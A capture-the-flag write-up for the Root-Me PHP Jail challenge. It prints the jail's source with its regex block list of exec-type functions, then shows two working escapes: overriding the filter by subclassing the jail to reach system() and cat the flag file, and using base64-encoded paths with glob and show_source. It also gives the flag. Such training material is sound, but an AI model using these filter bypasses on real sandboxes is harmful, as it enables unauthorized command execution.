# Php Jail

URL: [https://www.root-me.org/en/Challenges/App-Script/PHP-Jail](https://www.root-me.org/en/Challenges/App-Script/PHP-Jail)
## Statement

The flag is in a subdirectory, bypass the jail to read it.
## Challenge connection informations

| Key        | Value                                                                                                                                                                                                                                                                                                                                 |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Host       | challenge02.root-me.org                                                                                                                                                                                                                                                                                                               |
| Protocol   | SSH                                                                                                                                                                                                                                                                                                                                   |
| Port       | 2222                                                                                                                                                                                                                                                                                                                                  |
| SSH access | [ssh -p 2222 app-script-ch13@challenge02.root-me.org](ssh://app-script-ch13:app-script-ch13@challenge02.root-me.org:2222 "SSH access")     [![](https://www.root-me.org/squelettes/img/webssh.png?1454749832) WebSSH](http://webssh.root-me.org/?location=WebSSH_1988&ssh=ssh://app-script-ch13:app-script-ch13@challenge02 "WebSSH") |
| Username   | app-script-ch13                                                                                                                                                                                                                                                                                                                       |
| Password   | app-script-ch13                                                                                                                                                                                                                                                                                                                       |
## Solution

```php
➜ ssh -p 2222 app-script-ch13@challenge02.root-me.org
You are in jail ! MOUAHAH !
Dont try to escape this one, just go deeper in it.
Flag is in a subdirectory... Good Luck ! =)
>>> eval
NOPE!
>>> exec
NOPE!
>>> system
NOPE!
>>> print_r([1,2,3])
Array
(
    [0] => 1
    [1] => 2
    [2] => 3
)
```

We are inside interactive PHP shell, but with restrictions. Word `dir` is blocked which blocks `scandir` function too..

```php
>>> echo getcwd();
/challenge/app-script/ch13
>>> phpinfo();
...
_SERVER["SCRIPT_FILENAME"] => /challenge/app-script/ch13/ch13.php
...
```

The problem was reading the file, `file_get_contents` and anything related to opening files was blocked, but not `fgets` and `show_source`. Then another problem was "how to input filename?", because quotes were disabled this prevented using any strings..

After some PHP fuckery we can sneak in anything via `STDIN` from `fgets`, problem is function args don't like newline and we have to use `trim` which is blocked, but it has alternative `chop`:
```php
>>> show_source(chop(fgets(STDIN)));
/challenge/app-script/ch13/ch13.php
```

```php
#!/usr/bin/env php
<?php

error_reporting(0);
ini_set("display_errors", 0);

class Jail
{

    function filter($var) {
        if(preg_match('/(\'|\"|`|\.|\$|\/|require|include|exec|passthru|shell_exec|system|proc_open|popen|curl_exec|curl_multi_exec|require|require_once|include|include_once|eval|pcntl_exec|file|create_function|asser|extract|fopen|bzopen|gzopen|construct|chgrp|chmod|chown|copy|lchgrp|lchown|link|rmdir|tempnam|touch|dir|stat|read|hash|md5|sha1|hex|bin|highlight|substr|add|chr|convert|join|ord|trim|spaces|die|exit|call_user_func|reflection|break)/i', $var)) {
                return false;
        }
        return true;
    }

    public function run() {
        echo "                 _                                          \n";
        echo " _ __ ___   ___ | |_       _ __ ___   ___    ___  _ __ __ _ \n";
        echo "| '__/ _ \ / _ \| __| ___ | '_ ` _ \ / _ \  / _ \| '__/ _` |\n";
        echo "| | | (_) | (_) | |__|___|| | | | | |  __/_| (_) | | | (_| |\n";
        echo "|_|  \___/ \___/ \__|     |_| |_| |_|\___(_)\___/|_|  \__, |\n";
        echo "                                                      |___/ \n";
        echo "You are in jail ! MOUAHAH !                                 \n";
        echo "Don't try to escape this one, just go deeper in it.        \n";
        echo "Flag is in a subdirectory... Good Luck ! =)                 \n";
        while(true){
            echo ">>> ";
            $handle = fopen ("php://stdin","r");
            $cmd = fgets($handle);
            if($cmd != "\n"){
                if($this->filter($cmd)){
                    try {
                        $cmd = substr($cmd, 0, -1);
                        $cmd = str_replace('__FILE__',"preg_replace('@\(.*\(.*$@', '', __FILE__,1)",$cmd);
                        echo eval($cmd.';')."\n";
                    } catch (Throwable $e) {
                        echo "\n";
                    }
                }
                else{
                    echo "NOPE!\n";
                }
            }
            else{
                break;
            }
        }
    }
}

(new Jail)->run();

?>
```

With the source code known and `class` not blacklisted we can hijack jail, with better and nicer one!

```php
>>> class LetMeIn extends Jail { public function filter() { return true; } }
>>> (new LetMeIn)->run()
>>> system('find')
.
./ch13.php
./passwd
./passwd/.passwd
./.git
./._perms
>>> system('cat ./passwd/.passwd')
G00dJ0b!Th1sI5th3phpAYfl4g
```

::: tip Flag
G00dJ0b!Th1sI5th3phpAYfl4g
:::

### Solution 2

```php
>>> echo phpinfo();
Environment
...
HOME => /challenge/app-script/ch13
...
SHELL => /challenge/app-script/ch13/ch13.php
...

>>> print_r(glob(base64_decode(Li8q))); # *
Array
(
    [0] => ./ch13.php
    [1] => ./passwd
)

>>> print_r(glob(base64_decode(Li9wYXNzd2QvLio))); # ./passwd/.*
Array
(
    [0] => ./passwd/.
    [1] => ./passwd/..
    [2] => ./passwd/.passwd
)

>>> show_source(base64_decode(L2NoYWxsZW5nZS9hcHAtc2NyaXB0L2NoMTMvcGFzc3dkLy5wYXNzd2Q)); # /challenge/app-script/ch13/passwd/.passwd
```